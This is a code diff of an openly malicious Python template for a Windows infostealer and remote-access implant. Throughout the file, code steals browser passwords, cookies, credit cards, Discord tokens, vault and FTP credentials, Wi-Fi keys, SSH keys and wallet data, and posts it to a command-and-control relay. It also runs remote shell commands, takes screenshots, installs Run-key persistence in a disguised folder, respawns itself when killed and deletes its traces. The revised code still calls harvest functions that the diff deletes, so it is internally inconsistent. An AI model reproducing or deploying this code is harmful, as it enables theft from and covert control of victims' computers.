@@ -1,10 +1,10 @@
-# payload_template.py (Definitive, with corrected startup/migration logic)
-import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, traceback, random
+# payload/template.py (Full Code - Unified Main/Guardian Logic)
+import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, random, traceback
 from datetime import datetime, timezone, timedelta
 import sqlite3
 import xml.etree.ElementTree as ET
 
-# --- Graceful Import Handling ---
+# --- Optional Imports for Harvesting & Functionality ---
 try: from mss import mss
 except ImportError: mss = None
 try: import win32crypt
@@ -29,6 +29,9 @@ PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
 POPUP_ENABLED = {{POPUP_ENABLED}}
 POPUP_TITLE = {{POPUP_TITLE}}
 POPUP_MESSAGE = {{POPUP_MESSAGE}}
+END_TASK_POPUP_ENABLED = {{END_TASK_POPUP_ENABLED}}
+END_TASK_POPUP_TITLE = {{END_TASK_POPUP_TITLE}}
+END_TASK_POPUP_MESSAGE = {{END_TASK_POPUP_MESSAGE}}
 DECOY_ENABLED = {{DECOY_ENABLED}}
 DECOY_FILENAME = {{DECOY_FILENAME}}
 DECOY_DATA_B64 = {{DECOY_DATA_B64}}
@@ -36,7 +39,6 @@ HYDRA_ENABLED = {{HYDRA_ENABLED}}
 HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
 EMBEDDED_GUARDIANS = {{EMBEDDED_GUARDIANS}}
 
-# --- Global State ---
 results_to_send, results_lock = [], threading.Lock()
 TERMINATE_FLAG = threading.Event()
 
@@ -55,195 +57,86 @@ def _get_appdata_paths():
     base = os.path.expanduser("~")
     return { "local": os.path.join(base, "AppData", "Local"), "roaming": os.path.join(base, "AppData", "Roaming"), "user": base }
 
-# --- CORE HARVESTING FUNCTIONS (29 Fields) ---
-def _get_os_info():
-    u = platform.uname()
-    is_admin = 'Yes' if (ctypes and hasattr(ctypes.windll, 'shell32') and ctypes.windll.shell32.IsUserAnAdmin() != 0) else 'No'
-    return {
-        "OS Version & Build": f"{u.system} {u.release} (Build: {u.version})",
-        "System Architecture": u.machine,
-        "Hostname": socket.gethostname(),
-        "Users (and current)": f"Current: {getpass.getuser()} (Admin: {is_admin}) | All: {', '.join(os.listdir('C:/Users')) if platform.system() == 'Windows' else 'N/A'}",
-        "System Uptime": f"{((time.time() - psutil.boot_time()) / 3600):.2f} hours" if psutil else "N/A"
-    }
-
-def _get_hardware_info():
-    mem = psutil.virtual_memory() if psutil else None
-    gpus = _run_command('wmic path win32_VideoController get name /value').split('\n')
-    gpu_list = [g.split('=')[1].strip() for g in gpus if '=' in g]
-    return {
-        "Hardware Info (CPU, GPU, RAM, Disks)": f"CPU: {platform.processor()} | GPU(s): {', '.join(gpu_list) if gpu_list else 'N/A'} | RAM: {mem.total / (1024**3):.2f} GB" if mem else "N/A"
-    }
-
-def _get_security_products():
-    av = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value')
-    fw = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path FirewallProduct get displayName /value')
-    return { "Antivirus & Firewall Products": f"AV: {av.split('=')[-1].strip() if '=' in av else 'N/A'} | FW: {fw.split('=')[-1].strip() if '=' in fw else 'N/A'}" }
-
-def _get_network_info():
-    try: pub_ip = requests.get('https://api.ipify.org', timeout=5, verify=True).text
-    except: pub_ip = "N/A"
-    private_ip_v4 = "N/A"
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); private_ip_v4 = s.getsockname()[0]; s.close()
-    except: pass
-    return {
-        "IP Addresses (IPv4, IPv6, Public, Private)": f"Public: {pub_ip} | Private: {private_ip_v4} | IPv6: (Not Harvested)",
-        "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    }
-
-def _get_installed_apps():
-    output = _run_command('wmic product get name,version')
-    apps = [line.strip() for line in output.splitlines() if line.strip() and "Name" not in line and "Version" not in line]
-    return "\n".join(apps) if apps else "No applications found via WMIC."
-
-def _get_running_processes():
-    if not psutil: return "Psutil library not available."
-    procs = [f"{p.info['pid']:<8} {p.info.get('username', 'N/A'):<25} {p.info['name']}" for p in psutil.process_iter(['pid', 'name', 'username'])]
-    return "PID      Username                  Process Name\n" + "-"*60 + "\n" + "\n".join(procs)
-
-def _get_wifi_passwords():
-    if platform.system() != "Windows": return []
-    profiles_raw = _run_command("netsh wlan show profiles")
-    profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_raw)
-    results = []
-    for name in profile_names:
+# --- Core C2 Actions ---
+def _perform_total_annihilation(stealth_dir):
+    TERMINATE_FLAG.set()
+    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
         try:
-            profile_info = _run_command(f'netsh wlan show profile name="{name.strip()}" key=clear')
-            password = re.search(r"Key Content\s*:\s*(.*)", profile_info)
-            if password: results.append([name.strip(), password.group(1).strip()])
-        except: continue
-    return results
-
-def _get_clipboard():
-    if not (ctypes and hasattr(ctypes.windll, 'user32') and hasattr(ctypes.windll, 'kernel32')): return "ctypes library not available."
-    content = ""
-    try:
-        if ctypes.windll.user32.OpenClipboard(0):
-            handle = ctypes.windll.user32.GetClipboardData(1) # CF_TEXT = 1
-            if handle:
-                ptr = ctypes.windll.kernel32.GlobalLock(handle)
-                content = ctypes.c_char_p(ptr).value.decode('utf-8', 'ignore')
-                ctypes.windll.kernel32.GlobalUnlock(handle)
-            ctypes.windll.user32.CloseClipboard()
-    except Exception: return "Could not access clipboard."
-    return content if content else "(empty)"
-
-def _get_browser_data(appdata):
-    if platform.system() != "Windows" or not win32crypt or not AESGCM: return ([], [], [], [], [], [])
-    browser_paths = {'Chrome': os.path.join(appdata["local"], 'Google\\Chrome\\User Data'),'Edge': os.path.join(appdata["local"], 'Microsoft\\Edge\\User Data'),'Brave': os.path.join(appdata["local"], 'BraveSoftware\\Brave-Browser\\User Data'),'Opera': os.path.join(appdata["roaming"], 'Opera Software\\Opera Stable'),'Vivaldi': os.path.join(appdata["local"], 'Vivaldi\\User Data')}
-    all_pass, all_cookie, all_hist, all_auto, all_card, all_roblox = [], [], [], [], [], []
-    def decrypt(v, key):
-        try: return AESGCM(key).decrypt(v[3:15], v[15:-16], None).decode()
-        except: return ""
-    def get_chrome_time(t):
-        try: return (datetime(1601, 1, 1) + timedelta(microseconds=t)).strftime('%Y-%m-%d %H:%M:%S')
-        except: return "N/A"
-    for browser, path in browser_paths.items():
-        if not os.path.exists(path): continue
-        try:
-            local_state_path = os.path.join(path, "Local State");
-            with open(local_state_path, 'r', encoding='utf-8') as f: key = json.load(f)["os_crypt"]["encrypted_key"]
-            decryption_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-        except: continue
-        for profile in ['Default'] + [d for d in os.listdir(path) if d.startswith('Profile ')]:
-            for db_type, db_subpath, query, processor in [
-                ("passwords", 'Login Data', "SELECT origin_url, username_value, password_value FROM logins", lambda r,k: [r[0], r[1], decrypt(r[2], k)]),
-                ("cookies", os.path.join('Network', 'Cookies'), "SELECT host_key, name, expires_utc, encrypted_value FROM cookies", lambda r,k: [r[0], r[1], get_chrome_time(r[2]), decrypt(r[3], k)]),
-                ("history", 'History', "SELECT url, title, visit_count, last_visit_time FROM urls", lambda r,k: [r[0], r[1], r[2], get_chrome_time(r[3])]),
-                ("autofill", 'Web Data', "SELECT name, value FROM autofill", lambda r,k: [r[0], r[1]]),
-                ("cards", 'Web Data', "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", lambda r,k: [r[0], f"{r[1]}/{r[2]}", decrypt(r[3],k)])]:
-                db_path = os.path.join(path, profile, db_subpath)
-                if not os.path.exists(db_path): continue
-                try:
-                    temp_db = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4().hex}.db")
-                    shutil.copy(db_path, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    for row in conn.cursor().execute(query).fetchall():
-                        processed_row = processor(row, decryption_key)
-                        if len(processed_row) > 1 and processed_row[-1]:
-                            if db_type == "passwords": all_pass.append(processed_row)
-                            elif db_type == "cookies": 
-                                all_cookie.append(processed_row)
-                                if ".roblox.com" in processed_row[0] and "_ROBLOSECURITY" in processed_row[1]: all_roblox.append(processed_row[3])
-                            elif db_type == "history": all_hist.append(processed_row)
-                            elif db_type == "autofill": all_auto.append(processed_row)
-                            elif db_type == "cards": all_card.append(processed_row)
-                    conn.close(); os.remove(temp_db)
-                except Exception: pass
-    return all_pass, all_cookie, all_hist, all_auto, all_card, list(set(all_roblox))
-
-def _get_discord_tokens(appdata):
-    tokens = []; paths = {'Discord': os.path.join(appdata["roaming"], 'discord', 'Local Storage', 'leveldb'),'Canary': os.path.join(appdata["roaming"], 'discordcanary', 'Local Storage', 'leveldb'),'Lightcord': os.path.join(appdata["roaming"], 'lightcord', 'Local Storage', 'leveldb'),'PTB': os.path.join(appdata["roaming"], 'discordptb', 'Local Storage', 'leveldb'),}
-    for name, path in paths.items():
-        if os.path.exists(path):
-            for file_name in os.listdir(path):
-                if file_name.endswith((".log", ".ldb")):
-                    try:
-                        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
-                            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', f.read()):
-                                if token not in tokens: tokens.append(token)
-                    except: pass
-    return list(set(tokens))
-
-def _get_windows_vault():
-    if not win32cred: return []
-    creds = []
-    try:
-        enumerated_creds = win32cred.CredEnumerate(None, 0) or []
-        for cred_info in enumerated_creds:
-            try:
-                cred = win32cred.CredRead(cred_info['TargetName'], cred_info['Type'])
-                blob = cred.get('CredentialBlob')
-                password = blob.decode('utf-16-le', 'ignore') if blob else ''
-                creds.append([cred['TargetName'], cred['UserName'], password])
-            except: continue
-    except: pass
-    return creds
-
-def _get_filezilla_credentials(appdata):
-    creds = []; files_to_check = [os.path.join(appdata["roaming"], 'FileZilla', 'recentservers.xml'), os.path.join(appdata["roaming"], 'FileZilla', 'sitemanager.xml')]
-    for file in files_to_check:
-        if os.path.exists(file):
-            try:
-                tree = ET.parse(file)
-                for server in tree.findall('.//Server'):
-                    host = server.find('Host').text; port = server.find('Port').text; user = server.find('User').text
-                    password_node = server.find('Pass')
-                    password = base64.b64decode(password_node.text).decode('utf-8', 'ignore') if password_node is not None and password_node.text else ''
-                    creds.append([host, port, user, password])
-            except: pass
-    return creds
-
-def _get_telegram_session(appdata):
-    tdata_path = os.path.join(appdata["roaming"], "Telegram Desktop", "tdata")
-    return ["Telegram session folder (tdata) found." if os.path.exists(tdata_path) else "Telegram not found."]
-
-def _get_ssh_keys(appdata):
-    ssh_path = os.path.join(appdata["user"], ".ssh"); keys = ""
-    if os.path.exists(ssh_path):
-        for key_file in ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"]:
-            full_path = os.path.join(ssh_path, key_file)
-            if os.path.exists(full_path):
-                try:
-                    with open(full_path, 'r') as f: keys += f"--- {key_file} ---\n{f.read()}\n\n"
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+                for name in HYDRA_GUARDIANS:
+                    try: winreg.DeleteValue(reg_key, name)
+                    except FileNotFoundError: pass
+        except Exception: pass
+    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{uuid.uuid4().hex}.bat")
+    with open(cleanup_script_path, "w") as f:
+        f.write("@echo off\n")
+        f.write("timeout /t 3 /nobreak > NUL\n")
+        f.write(f'if exist "{stealth_dir}" ( rd /s /q "{stealth_dir}" )\n')
+        f.write(f'(goto) 2>nul & del "%~f0"\n')
+    subprocess.Popen([cleanup_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
+    if psutil:
+        my_pid = os.getpid()
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] in HYDRA_GUARDIANS and proc.info['pid'] != my_pid:
+                try: proc.terminate()
                 except: pass
-    return keys if keys else "No common SSH private keys found."
+    sys.exit(0)
 
-def _search_for_crypto_wallets(appdata):
-    wallet_locations = {'Exodus': os.path.join(appdata['roaming'], 'Exodus', 'exodus.wallet'),'Electrum': os.path.join(appdata['roaming'], 'Electrum', 'wallets'),'Atomic': os.path.join(appdata['roaming'], 'atomic', 'Local Storage', 'leveldb'),'Metamask (Chrome Ext)': os.path.join(appdata['local'], 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),'Metamask (Edge Ext)': os.path.join(appdata['local'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings', 'ejbalbakoplchlghecdalmeeeajnimhm'),}
-    found_wallets = [f"Found {name} data at: {path}" for name, path in wallet_locations.items() if os.path.exists(path)]
-    for root, _, files in os.walk(appdata['roaming']):
-        if 'wallet.dat' in files: found_wallets.append(f"Found wallet.dat in: {root}")
-    return found_wallets if found_wallets else ["No common cryptocurrency wallets found in AppData."]
+def _create_annihilation_packet(params):
+    try:
+        stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
+        annihilation_file = os.path.join(stealth_dir, "annihilate.pill")
+        with open(annihilation_file, 'w') as f: f.write('terminate')
+        return {"status": "success", "data": "Annihilation packet delivered."}
+    except Exception as e:
+        return {"status": "error", "data": f"Failed to deliver packet: {e}"}
 
-# --- STREAMING HARVEST WRAPPER ---
-def initial_harvest_stream():
+_action_self_destruct = _create_annihilation_packet
+
+def harvest_system_info():
+    try:
+        uname = platform.uname(); ip = "N/A"
+        try: ip = requests.get('https://api.ipify.org', timeout=10, verify=True).text
+        except: pass
+        data = { "hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "ip": ip, "arch": uname.machine }
+        return {"status": "success", "data": data}
+    except Exception: return {"status": "error", "data": {"hostname": socket.gethostname(), "user": getpass.getuser()}}
+
+def _action_popup(params):
+    if ctypes and hasattr(ctypes.windll, 'user32'):
+        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
+    return {"status": "success", "data": "Popup displayed."}
+
+def _action_shell(params):
+    command = params.get("command", "")
+    if not command: return {"status": "error", "data": "No command provided."}
+    return {"status": "success", "data": _run_command(command)}
+
+def _action_screenshot(params):
+    if not mss: return {"status": "error", "data": "MSS library not available."}
+    try:
+        with mss() as sct:
+            temp_path = os.path.join(os.environ["TEMP"], f'ss_{SESSION_ID}.png')
+            sct.shot(output=temp_path)
+            with open(temp_path, "rb") as f: img_b64 = base64.b64encode(f.read()).decode()
+            os.remove(temp_path)
+            return {"status": "success", "data": img_b64}
+    except Exception as e: return {"status": "error", "data": str(e)}
+
+def _action_pslist(params):
+    return {"status": "success", "data": _get_running_processes()}
+
+def perform_initial_harvest():
+    # This function now simply calls the individual harvest functions
+    # which will send results one-by-one
     appdata = _get_appdata_paths()
-    harvest_tasks = {
-        "os_info": _get_os_info, "hardware_info": _get_hardware_info, "security_products": _get_security_products,
-        "installed_apps": _get_installed_apps, "running_processes": _get_running_processes, "env_variables": lambda: dict(os.environ),
-        "network_info": _get_network_info, "wifi_passwords": _get_wifi_passwords, "active_connections": lambda: _run_command("netstat -an"),
+    all_harvest_functions = {
+        "os_info": _get_os_info, "hardware_info": _get_hardware_info,
+        "security_products": _get_security_products, "installed_apps": _get_installed_apps,
+        "running_processes": _get_running_processes, "env_variables": lambda: dict(os.environ),
+        "network_info": _get_network_info, "wifi_passwords": _get_wifi_passwords,
+        "active_connections": lambda: _run_command("netstat -an"),
         "arp_table": lambda: _run_command("arp -a"), "dns_cache": lambda: _run_command("ipconfig /displaydns"),
         "discord_tokens": lambda: _get_discord_tokens(appdata), "windows_vault": _get_windows_vault,
         "filezilla": lambda: _get_filezilla_credentials(appdata), "telegram": lambda: _get_telegram_session(appdata),
@@ -251,111 +144,164 @@ def initial_harvest_stream():
         "clipboard": _get_clipboard
     }
 
-    for name, func in harvest_tasks.items():
+    for name, func in all_harvest_functions.items():
         try:
-            send_result(name, func())
-        except Exception as e:
-            send_result(name, f"Error: {e}", status="error")
-        time.sleep(0.05) 
+            result = func()
+            send_result(name, result)
+        except Exception:
+            send_result(name, f"Error harvesting {name}", status="error")
+        time.sleep(0.1)
 
     try:
         passwords, cookies, history, autofill, cards, roblox_cookies = _get_browser_data(appdata)
-        send_result("browser_passwords", passwords); send_result("session_cookies", cookies)
-        send_result("browser_history", history); send_result("browser_autofill", autofill)
-        send_result("credit_cards", cards); send_result("roblox_cookies", roblox_cookies)
+        send_result("browser_passwords", passwords)
+        send_result("session_cookies", cookies)
+        send_result("browser_history", history)
+        send_result("browser_autofill", autofill)
+        send_result("credit_cards", cards)
+        send_result("roblox_cookies", roblox_cookies)
     except Exception as e:
-        send_result("browser_passwords", f"Error during browser harvest: {e}", status="error")
+        send_result("browser_passwords", f"Error harvesting browser data: {e}", status="error")
 
-# --- CORE C2 LOOP & ACTIONS ---
-def command_and_control_loop():
-    sys_info = _get_os_info()
-    hostname = sys_info.get("Hostname", "Unknown")
-    user = sys_info.get("Users (and current)", "Unknown")
-    os_version = sys_info.get("OS Version & Build", "Unknown")
-    
+
+def execute_command(command_data):
+    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
+    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
+    result = {"status": "error", "data": f"Unsupported action: {action}"}
+    if callable(handler_func):
+        try: result = handler_func(params)
+        except Exception as e: result = {"status": "error", "data": f"Handler failed: {e}"}
+    if response_id:
+        try:
+            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
+            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=True)
+        except requests.exceptions.RequestException: pass
+
+def command_and_control_loop(initial_metadata):
     while not TERMINATE_FLAG.is_set():
         try:
-            payload = { "session_id": SESSION_ID, "c2_user": C2_USER, "hostname": hostname, "user": user, "os": os_version }
             with results_lock:
-                if results_to_send:
-                    payload["results"] = results_to_send[:]; results_to_send.clear()
-            
-            response = requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=40, verify=False)
+                outgoing_results = results_to_send[:]; results_to_send.clear()
+            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, "hostname": initial_metadata.get("hostname"), "user": initial_metadata.get("user"), "os": initial_metadata.get("os")}
+            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=True)
             if response.status_code == 200:
                 for cmd in response.json().get("commands", []):
                     threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
-        except requests.exceptions.RequestException:
-            pass 
-        time.sleep(random.randint(5, 10))
+        except requests.exceptions.RequestException: pass
+        time.sleep(random.randint(8, 15))
 
-def execute_command(command_data):
-    pass # Placeholder for future interactive commands
+def hydra_watchdog(home_dir):
+    if not psutil: return
+    guardian_names = HYDRA_GUARDIANS
+    my_name = os.path.basename(sys.executable)
+    heal_lock_file = os.path.join(os.environ["TEMP"], "tether_heal.lock")
+    annihilation_file = os.path.join(home_dir, "annihilate.pill")
+    while not TERMINATE_FLAG.is_set():
+        if os.path.exists(annihilation_file):
+            _perform_total_annihilation(home_dir); break
+        try:
+            running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
+            missing_guardians = set(guardian_names) - running_procs
+            if missing_guardians:
+                lock_acquired = False
+                try:
+                    if os.path.exists(heal_lock_file):
+                        if (time.time() - os.path.getmtime(heal_lock_file)) > 15: os.remove(heal_lock_file)
+                        else: time.sleep(10); continue
+                    with open(heal_lock_file, 'w') as f: f.write(str(time.time())); lock_acquired = True
+                    if END_TASK_POPUP_ENABLED: _action_popup({"title": END_TASK_POPUP_TITLE or "Critical Process Failure", "message": END_TASK_POPUP_MESSAGE or "A required system process has been terminated..."})
+                    for guardian_name in missing_guardians:
+                        guardian_path = os.path.join(home_dir, guardian_name)
+                        if os.path.exists(guardian_path): subprocess.Popen([guardian_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
+                finally:
+                    if lock_acquired and os.path.exists(heal_lock_file): os.remove(heal_lock_file)
+        except Exception: pass
+        time.sleep(10)
 
-# --- PERSISTENCE, MIGRATION, AND MAIN EXECUTION ---
-def install_persistence(path):
+def initial_lure():
+    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
+    if DECOY_ENABLED:
+        try:
+            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
+            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
+            os.startfile(decoy_path)
+        except: pass
+
+def install_persistence(stealth_dir):
     if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
         try:
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            key_name = os.path.basename(path) # Use the actual filename for the key name
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, path)
+                for name in HYDRA_GUARDIANS:
+                     winreg.SetValueEx(reg_key, os.path.splitext(name)[0], 0, winreg.REG_SZ, os.path.join(stealth_dir, name))
         except: pass
+
+def migrate_and_spawn(stealth_dir):
+    try:
+        os.makedirs(stealth_dir, exist_ok=True)
+        my_name = os.path.basename(sys.executable); my_path = os.path.abspath(sys.executable)
+        
+        migrator_script_path = os.path.join(os.environ["TEMP"], f"migrate_{uuid.uuid4().hex}.bat")
+        with open(migrator_script_path, "w") as f:
+            f.write("@echo off\n")
+            f.write("ping 127.0.0.1 -n 6 > nul\n") # More reliable wait
+            for filename, b64_data in EMBEDDED_GUARDIANS.items():
+                new_path = os.path.join(stealth_dir, filename)
+                f.write(f'move /Y "{my_path}" "{new_path}"\n')
+                f.write(f'if exist "{new_path}" (\n')
+                f.write(f'    start "" "{new_path}"\n')
+                f.write(f')\n')
+                break # Only need to move the main payload once
+            f.write(f'(goto) 2>nul & del "%~f0"\n')
+
+        subprocess.Popen([migrator_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
+        sys.exit(0)
+    except: sys.exit(1)
+
 
 def spawn_guardians(stealth_dir):
     if EMBEDDED_GUARDIANS:
         for filename, b64_data in EMBEDDED_GUARDIANS.items():
+            if filename == os.path.basename(sys.executable): continue # Don't respawn self
             try:
                 file_path = os.path.join(stealth_dir, filename)
                 if not os.path.exists(file_path):
                     with open(file_path, 'wb') as f: f.write(base64.b64decode(b64_data))
-                subprocess.Popen([file_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW, close_fds=True)
+                subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
             except: pass
 
 if __name__ == "__main__":
     stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
-    my_path = os.path.abspath(sys.executable)
-    my_dir = os.path.dirname(my_path)
-    new_path = os.path.join(stealth_dir, os.path.basename(my_path))
-
-    # --- STAGE 1: MIGRATION ---
-    # This logic only runs if the executable is compiled and not already in the stealth directory.
-    if my_dir.lower() != stealth_dir.lower() and hasattr(sys, 'frozen'):
-        try:
-            os.makedirs(stealth_dir, exist_ok=True)
-            shutil.copy(my_path, new_path)
-            # Launch the new copy as a completely separate process
-            subprocess.Popen([new_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
-            # The original process has fulfilled its purpose and can now exit.
-            sys.exit(0)
-        except Exception:
-            # If migration fails, do not proceed.
-            sys.exit(1)
+    my_current_path = os.path.dirname(os.path.abspath(sys.executable))
     
-    # --- STAGE 2: PERSISTENT EXECUTION (runs from stealth_dir) ---
-    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{SESSION_ID[:8]}.flg")
-    
-    if not os.path.exists(flag_file):
-        if POPUP_ENABLED:
-            try: ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, POPUP_TITLE, 0)
-            except: pass
-        if DECOY_ENABLED:
-            try:
-                decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
-                with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
-                os.startfile(decoy_path)
-            except: pass
-        
-        install_persistence(new_path)
-        threading.Thread(target=initial_harvest_stream, daemon=True).start()
-        
-        try:
-            with open(flag_file, 'w') as f: f.write('ran')
-        except: pass
+    # --- FIX: The core logic fix is here. Migration only happens if not already in the stealth dir. ---
+    if my_current_path.lower() != stealth_dir.lower() and hasattr(sys, 'frozen'):
+        initial_lure()
+        migrate_and_spawn(stealth_dir)
     else:
-        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Payload instance restarted.")
+        # Flag file now indicates that this specific process has completed its first-run tasks
+        flag_file = os.path.join(stealth_dir, f"flag_{os.path.basename(sys.executable)}.flg")
+        is_first_run_for_this_process = not os.path.exists(flag_file)
 
-    if HYDRA_ENABLED:
-        spawn_guardians(stealth_dir)
-        # In a full implementation, a thread for the Hydra watchdog would start here.
+        if is_first_run_for_this_process:
+            if HYDRA_ENABLED:
+                spawn_guardians(stealth_dir)
+                install_persistence(stealth_dir)
+            threading.Thread(target=perform_initial_harvest, daemon=True).start()
+            try:
+                with open(flag_file, 'w') as f: f.write('done')
+            except: pass
+        else:
+            now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
+            send_result("Agent Event", f"[{now}] Payload instance (re)started or revived.")
 
-    command_and_control_loop()
+        initial_info = harvest_system_info()
+        initial_metadata = initial_info.get("data", {})
+        c2_thread = threading.Thread(target=command_and_control_loop, args=(initial_metadata,), daemon=True)
+        c2_thread.start()
+
+        if HYDRA_ENABLED:
+            watchdog_thread = threading.Thread(target=hydra_watchdog, args=(stealth_dir,), daemon=True)
+            watchdog_thread.start()
+            
+        TERMINATE_FLAG.wait()
